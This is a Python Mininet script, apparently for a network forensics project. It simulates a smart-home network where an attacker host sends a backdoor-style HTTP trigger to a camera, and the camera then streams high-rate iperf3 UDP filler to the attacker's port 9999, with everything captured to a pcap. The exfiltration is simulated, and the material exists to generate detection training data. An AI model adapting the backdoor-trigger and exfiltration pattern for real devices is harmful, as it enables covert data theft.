#!/usr/bin/env python3
"""
=============================================================================
Network Forensics Project — Scenario 3: Unauthorized State Change and
                            Data Exfiltration
=============================================================================
Topology
--------
  [camera]  ──┐
  [thermostat] ──── [gateway (OVS)] ── (internet / external)
  [attacker]──┘

Behaviour
---------
  • camera      : (Baseline) Continuous UDP stream → thermostat:50005
                  (Baseline) NTP sync every 600 s → 91.189.91.157:123
                  (Baseline) DNS queries every 60 s → gateway:53
                  (Baseline) TLS telemetry every 300 s → 93.184.216.34:443
                  (Compromised) High-density UDP exfiltration → attacker:9999
                  triggered by attacker after EXFIL_START_DELAY seconds.
  • thermostat  : (Baseline) TCP keep-alive every 10 s → gateway:8883
                  (Baseline) Temperature report every 360 s → gateway:8883
                  (Baseline) NTP sync every 600 s → 91.189.91.157:123
                  (Baseline) DNS queries every 60 s → gateway:53
  • attacker    : Phase 1 — Sends a TCP command packet to camera:443
                             (simulates triggering the compromised firmware)
                  Phase 2 — Receives high-density UDP stream from camera
                             on attacker:9999 (acts as exfiltration server)

Capture
-------
  tcpdump is launched automatically on ALL interfaces (-i any).
  The pcap file will be written to /tmp/scenario3_exfiltration.pcap

Usage
-----
  sudo python3 scenario3_exfiltration.py [--duration SECONDS] [--pcap PATH]

Requirements
------------
  • Mininet   (http://mininet.org)
  • Open vSwitch (OVS)
  • Python 3.6+
  • iperf3    — install with: sudo apt install iperf3
=============================================================================
"""

import argparse
import sys
import time
import subprocess

from mininet.net    import Mininet
from mininet.node   import OVSSwitch, Controller, OVSController
from mininet.link   import TCLink
from mininet.log    import setLogLevel, info, error
from mininet.cli    import CLI
from mininet.clean  import cleanup


# ---------------------------------------------------------------------------
# Constants — Baseline (mirrors scenarios 1 & 2)
# ---------------------------------------------------------------------------
DEFAULT_DURATION       = 3600
DEFAULT_PCAP_PATH      = "/tmp/scenario3_exfiltration.pcap"
CAMERA_PORT            = 50005         # UDP — simulated legitimate video feed
MQTT_PORT              = 8883          # TCP — Secure MQTT
NTP_PORT               = 123           # UDP — NTP
DNS_PORT               = 53            # UDP — DNS
TLS_PORT               = 443           # TCP — TLS cloud telemetry
KEEPALIVE_INTERVAL     = 10            # Seconds between thermostat keep-alives
TEMPERATURE_INTERVAL   = 360           # Seconds between temperature reports
NTP_INTERVAL           = 600           # Seconds between NTP syncs
DNS_INTERVAL           = 60            # Seconds between DNS queries
TLS_INTERVAL           = 300           # Seconds between TLS telemetry reports
NTP_SERVER             = "91.189.91.157"
TLS_CLOUD_SERVER       = "93.184.216.34"
UDP_BANDWIDTH          = "500K"        # Normal camera stream bandwidth

# ---------------------------------------------------------------------------
# Constants — Attacker / Exfiltration (Scenario 3 specific)
# ---------------------------------------------------------------------------
ATTACKER_IP            = "10.0.0.3"   # Attacker's IP (unauthorized destination)
CAMERA_IP              = "10.0.0.1"   # Camera IP (compromised device)
EXFIL_PORT             = 9999          # Unauthorized exfiltration destination port
EXFIL_BANDWIDTH        = "5M"          # Exfiltration bandwidth — 10× the normal rate
EXFIL_START_DELAY      = 60            # Seconds of clean baseline before attack begins
                                       # This creates a clear pre/post boundary in pcap
TRIGGER_PORT           = 443           # Port used to deliver the compromise trigger


# ---------------------------------------------------------------------------
# Topology builder
# ---------------------------------------------------------------------------

def build_topology(pcap_path: str):
    """
    Create and return a running Mininet network with the smart-home topology.

    Returns
    -------
    net : Mininet
        The running network object.
    gateway : OVSSwitch
        The central OVS gateway switch.
    camera, thermostat, attacker : Host
        The three IoT / attacker hosts.
    """
    info("*** Cleaning up any previous Mininet state\n")
    cleanup()

    info("*** Creating Mininet network\n")
    net = Mininet(
        controller=None,
        switch=OVSSwitch,
        link=TCLink,
        autoSetMacs=True,
        autoStaticArp=True,
    )

    info("*** Adding OVS gateway switch\n")
    gateway = net.addSwitch("s1", cls=OVSSwitch, failMode="standalone")

    info("*** Adding hosts\n")
    camera     = net.addHost("camera",     ip="10.0.0.1/24", mac="00:00:00:00:00:01")
    thermostat = net.addHost("thermostat", ip="10.0.0.2/24", mac="00:00:00:00:00:02")
    attacker   = net.addHost("attacker",   ip="10.0.0.3/24", mac="00:00:00:00:00:03")

    info("*** Creating links\n")
    net.addLink(camera,     gateway)   # s1-eth1
    net.addLink(thermostat, gateway)   # s1-eth2
    net.addLink(attacker,   gateway)   # s1-eth3

    info("*** Starting network\n")
    net.start()

    info("*** Testing connectivity\n")
    net.pingAll()

    return net, gateway, camera, thermostat, attacker


# ---------------------------------------------------------------------------
# Baseline traffic generators (mirrors scenarios 1 & 2)
# ---------------------------------------------------------------------------

def start_camera_udp_stream(camera, sink_ip: str, duration: int):
    """
    Camera → thermostat : continuous legitimate UDP video stream at ~500 KB/s.
    This is the normal baseline stream. The exfiltration stream to the attacker
    will be added on top of this once the compromise is triggered, so both flows
    are visible simultaneously in the pcap.
    """
    info("*** [camera] Starting legitimate UDP video-feed stream\n")

    camera.cmd(
        f"iperf3 -s -u -p {CAMERA_PORT} -1 --daemon "
        f"--logfile /tmp/iperf3_server_camera.log"
    )
    time.sleep(1)

    camera.cmd(
        f"iperf3 -c {sink_ip} -u -p {CAMERA_PORT} "
        f"-b {UDP_BANDWIDTH} -t {duration} "
        f"--logfile /tmp/iperf3_client_camera_baseline.log &"
    )
    info(
        f"    camera → thermostat ({sink_ip}:{CAMERA_PORT}) "
        f"UDP {UDP_BANDWIDTH} for {duration}s\n"
    )


def start_thermostat_keepalive(thermostat, gateway_ip: str, duration: int):
    """
    Thermostat → gateway : TCP keep-alive every KEEPALIVE_INTERVAL s.
    Simulates a Secure MQTT PINGREQ heartbeat on port 8883.
    """
    info("*** [thermostat] Starting Secure MQTT keep-alive simulation\n")

    keepalive_script = (
        f"while true; do "
        f"  python3 -c \""
        f"import socket; "
        f"s = socket.socket(); "
        f"s.settimeout(3); "
        f"s.connect(('{gateway_ip}', {MQTT_PORT})); "
        f"s.send(b'MQTT_PINGREQ'); "
        f"s.close()\" 2>/dev/null || "
        f"  ping -c 1 -W 2 {gateway_ip} > /dev/null 2>&1; "
        f"  sleep {KEEPALIVE_INTERVAL}; "
        f"done"
    )

    thermostat.cmd(f"bash -c '{keepalive_script}' &")
    info(
        f"    thermostat → gateway ({gateway_ip}:{MQTT_PORT}) "
        f"TCP keep-alive every {KEEPALIVE_INTERVAL}s\n"
    )


def start_thermostat_temperature_report(thermostat, gateway_ip: str, duration: int):
    """
    Thermostat → gateway : MQTT PUBLISH every TEMPERATURE_INTERVAL s.
    Simulates a thermostat sending its temperature reading every 6 minutes.
    """
    info("*** [thermostat] Starting temperature report simulation\n")

    report_script = (
        f"while true; do "
        f"  python3 -c \""
        f"import socket; "
        f"s = socket.socket(); "
        f"s.settimeout(3); "
        f"s.connect(('{gateway_ip}', {MQTT_PORT})); "
        f"s.send(b'MQTT_PUBLISH: topic=home/thermostat/temperature payload=22.5C'); "
        f"s.close()\" 2>/dev/null || "
        f"  ping -c 1 -W 2 {gateway_ip} > /dev/null 2>&1; "
        f"  sleep {TEMPERATURE_INTERVAL}; "
        f"done"
    )

    thermostat.cmd(f"bash -c '{report_script}' &")
    info(
        f"    thermostat → gateway ({gateway_ip}:{MQTT_PORT}) "
        f"temperature report every {TEMPERATURE_INTERVAL}s\n"
    )


def start_ntp_sync(node, ntp_server_ip: str):
    """
    Periodic NTP requests (UDP/123) from an IoT device to an external NTP server.
    Sends a valid 48-byte NTP client request every NTP_INTERVAL seconds.
    """
    info(f"*** [{node.name}] Starting simulated NTP sync to {ntp_server_ip}\n")

    ntp_script = (
        f"while true; do "
        f"  python3 -c \""
        f"import socket; "
        f"s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); "
        f"s.sendto(b'\\x1b' + 47 * b'\\x00', ('{ntp_server_ip}', {NTP_PORT}))\" 2>/dev/null; "
        f"  sleep {NTP_INTERVAL}; "
        f"done"
    )

    node.cmd(f"bash -c '{ntp_script}' &")


def start_camera_dns_queries(camera, gateway_ip: str):
    """
    Camera → gateway : periodic UDP DNS queries (port 53) every DNS_INTERVAL s.
    Simulates hostname resolution for api.smartcamera.com.
    """
    info(f"*** [camera] Starting simulated DNS queries to {gateway_ip}\n")

    dns_query = (
        "b'\\x00\\x01'"
        " + b'\\x01\\x00'"
        " + b'\\x00\\x01'"
        " + b'\\x00\\x00' * 3"
        " + b'\\x03api\\x0csmartcamera\\x03com\\x00'"
        " + b'\\x00\\x01'"
        " + b'\\x00\\x01'"
    )

    dns_script = (
        f"while true; do "
        f"  python3 -c \""
        f"import socket; "
        f"s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); "
        f"s.sendto({dns_query}, ('{gateway_ip}', {DNS_PORT}))\" 2>/dev/null; "
        f"  sleep {DNS_INTERVAL}; "
        f"done"
    )

    camera.cmd(f"bash -c '{dns_script}' &")
    info(
        f"    camera → gateway ({gateway_ip}:{DNS_PORT}) "
        f"UDP DNS query every {DNS_INTERVAL}s\n"
    )


def start_camera_tls_telemetry(camera, cloud_server_ip: str):
    """
    Camera → Internet : periodic TCP connection on port 443 every TLS_INTERVAL s.
    Simulates TLS cloud telemetry to api.smartcamera.com.
    """
    info(f"*** [camera] Starting simulated TLS telemetry to {cloud_server_ip}\n")

    tls_script = (
        f"while true; do "
        f"  python3 -c \""
        f"import socket; "
        f"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); "
        f"s.settimeout(3); "
        f"s.connect(('{cloud_server_ip}', {TLS_PORT})); "
        f"s.send(b'\\x16\\x03\\x01\\x00\\xf1\\x01\\x00\\x00\\xed\\x03\\x03'); "
        f"s.close()\" 2>/dev/null; "
        f"  sleep {TLS_INTERVAL}; "
        f"done"
    )

    camera.cmd(f"bash -c '{tls_script}' &")
    info(
        f"    camera → cloud ({cloud_server_ip}:{TLS_PORT}) "
        f"TCP TLS telemetry every {TLS_INTERVAL}s\n"
    )


def start_thermostat_dns_queries(thermostat, gateway_ip: str):
    """
    Thermostat → gateway : periodic UDP DNS queries (port 53) every DNS_INTERVAL s.
    Simulates hostname resolution for mqtt.smartthermostat.com.
    """
    info(f"*** [thermostat] Starting simulated DNS queries to {gateway_ip}\n")

    dns_query = (
        "b'\\x00\\x02'"
        " + b'\\x01\\x00'"
        " + b'\\x00\\x01'"
        " + b'\\x00\\x00' * 3"
        " + b'\\x04mqtt\\x0fsmartThermostat\\x03com\\x00'"
        " + b'\\x00\\x01'"
        " + b'\\x00\\x01'"
    )

    dns_script = (
        f"while true; do "
        f"  python3 -c \""
        f"import socket; "
        f"s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); "
        f"s.sendto({dns_query}, ('{gateway_ip}', {DNS_PORT}))\" 2>/dev/null; "
        f"  sleep {DNS_INTERVAL}; "
        f"done"
    )

    thermostat.cmd(f"bash -c '{dns_script}' &")
    info(
        f"    thermostat → gateway ({gateway_ip}:{DNS_PORT}) "
        f"UDP DNS query every {DNS_INTERVAL}s\n"
    )


# ---------------------------------------------------------------------------
# Attacker traffic generators (Scenario 3 specific)
# ---------------------------------------------------------------------------

def start_exfiltration_server(attacker, exfil_duration: int):
    """
    Attacker : starts an iperf3 UDP server on EXFIL_PORT to receive the
    high-density exfiltration stream from the compromised camera.

    The server is launched before the trigger is sent, ensuring it is ready
    to receive data as soon as the camera begins streaming.
    """
    info(f"*** [attacker] Starting exfiltration server on UDP port {EXFIL_PORT}\n")

    attacker.cmd(
        f"iperf3 -s -u -p {EXFIL_PORT} --daemon "
        f"--logfile /tmp/iperf3_server_exfil.log"
    )
    time.sleep(1)
    info(f"    attacker listening on UDP:{EXFIL_PORT}\n")


def send_compromise_trigger(attacker, camera_ip: str, exfil_start_delay: int):
    """
    Attacker → camera:443 : sends a single TCP command packet after
    EXFIL_START_DELAY seconds to simulate triggering the compromised firmware.

    This single anomalous outbound connection from the attacker to the camera
    appears in the pcap immediately before the exfiltration spike begins,
    providing the forensic causal link between the trigger and the state change.

    The payload mimics an HTTP POST to a backdoor endpoint, a common pattern
    in compromised IoT firmware command-and-control.
    """
    info(
        f"*** [attacker] Scheduling compromise trigger → "
        f"camera ({camera_ip}:{TRIGGER_PORT}) "
        f"in {exfil_start_delay}s\n"
    )

    trigger_script = (
        f"python3 -c \""
        f"import socket, time; "
        f"time.sleep({exfil_start_delay}); "
        f"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); "
        f"s.settimeout(3); "
        f"print('--- [attacker] Sending compromise trigger ---'); "
        f"s.connect_ex(('{camera_ip}', {TRIGGER_PORT})); "
        f"s.send("
        f"  b'POST /api/v1/stream/start HTTP/1.1\\r\\n'"
        f"  b'Host: {camera_ip}\\r\\n'"
        f"  b'X-Backdoor-Token: c0mpr0m1sed\\r\\n'"
        f"  b'X-Exfil-Target: {ATTACKER_IP}:{EXFIL_PORT}\\r\\n'"
        f"  b'Content-Length: 0\\r\\n\\r\\n'"
        f"); "
        f"s.close(); "
        f"print('--- [attacker] Trigger sent ---'); "
        f"\""
    )

    attacker.cmd(f"bash -c '{trigger_script}' &")


def start_exfiltration_stream(camera, attacker_ip: str,
                               exfil_start_delay: int, remaining_duration: int):
    """
    Camera → attacker:EXFIL_PORT : high-density UDP data exfiltration stream.

    After EXFIL_START_DELAY seconds (synchronised with the trigger), the
    compromised camera begins streaming at EXFIL_BANDWIDTH (5 Mbps) to the
    attacker's IP on the unauthorized port. This is 10× the normal 500 KB/s
    legitimate video stream, creating a clearly visible volumetric spike.

    Key forensic indicators this generates:
      • Sudden 10× increase in camera outbound UDP traffic volume
      • New destination IP (10.0.0.3) — never seen in baseline
      • New destination port (9999) — not in the camera's MUD profile
      • Larger average packet lengths (iperf3 fills MTU at high bandwidth)
      • Two simultaneous UDP streams from the same source IP
    """
    info(
        f"*** [camera] Scheduling exfiltration stream → "
        f"attacker ({attacker_ip}:{EXFIL_PORT}) "
        f"starting in {exfil_start_delay}s at {EXFIL_BANDWIDTH}/s\n"
    )

    exfil_script = (
        f"python3 -c \""
        f"import time; "
        f"time.sleep({exfil_start_delay}); "
        f"print('--- [camera] Exfiltration stream started ---'); "
        f"import subprocess; "
        f"subprocess.Popen(["
        f"  'iperf3', '-c', '{attacker_ip}', '-u', '-p', '{EXFIL_PORT}', "
        f"  '-b', '{EXFIL_BANDWIDTH}', '-t', '{remaining_duration}', "
        f"  '--logfile', '/tmp/iperf3_client_exfil.log'"
        f"]); "
        f"\""
    )

    camera.cmd(f"bash -c '{exfil_script}' &")
    info(
        f"    camera → attacker ({attacker_ip}:{EXFIL_PORT}) "
        f"UDP {EXFIL_BANDWIDTH} exfiltration "
        f"(starts at T+{exfil_start_delay}s)\n"
    )


# ---------------------------------------------------------------------------
# Capture instructions
# ---------------------------------------------------------------------------

TCPDUMP_BANNER = """
╔══════════════════════════════════════════════════════════════════════════════╗
║   tcpdump CAPTURE — Scenario 3 Unauthorized State Change & Exfiltration    ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  Capturing ALL traffic on every interface (-i any).                         ║
║                                                                              ║
║  The capture file will be saved to:                                          ║
║    {pcap_path}                                                               ║
║                                                                              ║
║  To open the capture afterwards:                                             ║
║    wireshark {pcap_path}                                                     ║
║    tshark -r {pcap_path} -T fields -e frame.number -e ip.src -e ip.dst      ║
║            -e ip.proto -e frame.len                                          ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""


def print_capture_instructions(pcap_path: str):
    print(TCPDUMP_BANNER.format(pcap_path=pcap_path))


# ---------------------------------------------------------------------------
# Automated in-process tcpdump launch
# ---------------------------------------------------------------------------

def launch_tcpdump(pcap_path: str) -> subprocess.Popen:
    """
    Launch tcpdump on all interfaces (-i any) to capture the full scenario.
    Returns the Popen handle so the caller can terminate it later.
    """
    iface = "any"
    cmd = ["tcpdump", "-i", iface, "-w", pcap_path, "--immediate-mode"]
    info(f"*** Launching tcpdump on {iface} → {pcap_path}\n")
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        time.sleep(1)
        return proc
    except FileNotFoundError:
        error("tcpdump not found — install with: sudo apt install tcpdump\n")
        return None
    except PermissionError:
        error("tcpdump requires root privileges. Run the script with sudo.\n")
        return None


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(
        description="Scenario 3 — Unauthorized State Change and Data Exfiltration (Mininet)"
    )
    parser.add_argument(
        "--duration", "-d",
        type=int,
        default=DEFAULT_DURATION,
        help=f"How long (seconds) to run the scenario. "
             f"Default: {DEFAULT_DURATION}. Use 0 for interactive CLI.",
    )
    parser.add_argument(
        "--pcap", "-p",
        type=str,
        default=DEFAULT_PCAP_PATH,
        help=f"Output path for the scenario pcap file. Default: {DEFAULT_PCAP_PATH}",
    )
    return parser.parse_args()


def run_scenario(args):
    setLogLevel("info")

    info("=" * 70 + "\n")
    info(" Scenario 3 — Unauthorized State Change and Data Exfiltration\n")
    info("=" * 70 + "\n")

    print_capture_instructions(args.pcap)

    # ── Build topology ────────────────────────────────────────────────────
    net, gateway, camera, thermostat, attacker = build_topology(args.pcap)

    gateway_ip = "10.0.0.2"   # Thermostat acts as MQTT broker / NVR proxy

    # ── Launch tcpdump ────────────────────────────────────────────────────
    tcpdump_proc = launch_tcpdump(args.pcap)

    # ── Start baseline traffic ────────────────────────────────────────────
    info("\n*** Starting baseline traffic generators\n")

    start_thermostat_keepalive(thermostat, gateway_ip, args.duration)
    start_thermostat_temperature_report(thermostat, gateway_ip, args.duration)
    start_thermostat_dns_queries(thermostat, gateway_ip)

    start_camera_udp_stream(camera, gateway_ip, args.duration)
    start_camera_dns_queries(camera, gateway_ip)
    start_camera_tls_telemetry(camera, TLS_CLOUD_SERVER)

    start_ntp_sync(camera, NTP_SERVER)
    start_ntp_sync(thermostat, NTP_SERVER)

    # ── Start attacker — exfiltration sequence ────────────────────────────
    info("\n*** Starting attacker exfiltration sequence\n")
    info(
        f"    Baseline will run cleanly for {EXFIL_START_DELAY}s, "
        f"then the compromise trigger will be sent and exfiltration will begin.\n"
    )

    # Remaining duration after the initial clean baseline window
    exfil_duration = args.duration - EXFIL_START_DELAY

    # Start the exfiltration server on the attacker immediately (must be
    # ready before the camera starts streaming)
    start_exfiltration_server(attacker, exfil_duration)

    # Schedule the TCP trigger command from attacker → camera
    send_compromise_trigger(attacker, CAMERA_IP, EXFIL_START_DELAY)

    # Schedule the high-density exfiltration stream from camera → attacker
    start_exfiltration_stream(camera, ATTACKER_IP, EXFIL_START_DELAY, exfil_duration)

    # ── Run scenario ─────────────────────────────────────────────────────
    if args.duration == 0:
        info("\n*** Dropping into interactive CLI (duration=0)\n")
        info("    Type 'exit' or Ctrl-D to stop the scenario.\n\n")
        CLI(net)
    else:
        info(f"\n*** Scenario running for {args.duration} seconds …\n")
        info(f"    Exfiltration begins at T+{EXFIL_START_DELAY}s.\n")
        info("    Press Ctrl-C to stop early.\n\n")
        try:
            for elapsed in range(args.duration):
                time.sleep(1)
                if (elapsed + 1) % 10 == 0:
                    phase = (
                        "BASELINE only"
                        if (elapsed + 1) <= EXFIL_START_DELAY
                        else "BASELINE + EXFILTRATION active"
                    )
                    info(
                        f"    [{elapsed + 1:4d}/{args.duration}s] "
                        f"Scenario 3 — {phase}\n"
                    )
        except KeyboardInterrupt:
            info("\n*** Interrupted by user\n")

    # ── Teardown ─────────────────────────────────────────────────────────
    info("\n*** Stopping scenario\n")

    if tcpdump_proc and tcpdump_proc.poll() is None:
        tcpdump_proc.terminate()
        tcpdump_proc.wait()
        info(f"*** tcpdump stopped — capture saved to {args.pcap}\n")

    net.stop()
    info("*** Network stopped\n")
    info(f"\n    Scenario 3 capture: {args.pcap}\n")
    info("    Open with: wireshark " + args.pcap + "\n")
    info("=" * 70 + "\n")


if __name__ == "__main__":
    args = parse_args()

    import os
    if os.geteuid() != 0:
        print("[ERROR] This script must be run with sudo / as root.")
        sys.exit(1)

    run_scenario(args)
